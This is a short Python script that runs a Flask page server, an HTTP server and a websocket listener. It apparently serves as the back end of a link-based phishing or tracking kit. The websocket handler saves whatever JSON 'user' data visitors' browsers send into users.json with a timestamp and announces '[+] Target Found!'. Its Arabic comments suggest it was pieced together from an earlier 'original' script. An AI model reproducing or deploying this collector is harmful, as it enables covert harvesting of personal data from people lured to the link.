from flask import Flask, send_from_directory
import threading

app = Flask(__name__)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

def run_flask():
    app.run(host='0.0.0.0', port=5000)

import asyncio
import json
import time
import threading
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
import websockets

USER_FILE = "users.json"
HTTP_PORT = 8000
WS_PORT = 8765

def save_user(user):
    try:
        with open(USER_FILE, 'r') as f: users = json.load(f)
    except: users = []
    users.append(user)
    with open(USER_FILE, 'w') as f: json.dump(users, f, indent=2)

async def ws_handler(ws):
    try:
        data = await ws.recv()
        user = json.loads(data)
        user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        save_user(user)
        print("\n[+] Target Found!")
    except: pass

async def start_ws():
    async with websockets.serve(ws_handler, "0.0.0.0", WS_PORT):
        await asyncio.Future()

def start_http():
    server = HTTPServer(("0.0.0.0", HTTP_PORT), SimpleHTTPRequestHandler)
    server.serve_forever()
if __name__ == "__main__":
    # تشغيل سيرفر الروابط (Flask) في الخلفية
    threading.Thread(target=run_flask, daemon=True).start()

    # كودك الأصلي (راكوان) يبقى كما هو هنا
    threading.Thread(target=start_http, daemon=True).start()
    asyncio.run(start_ws())

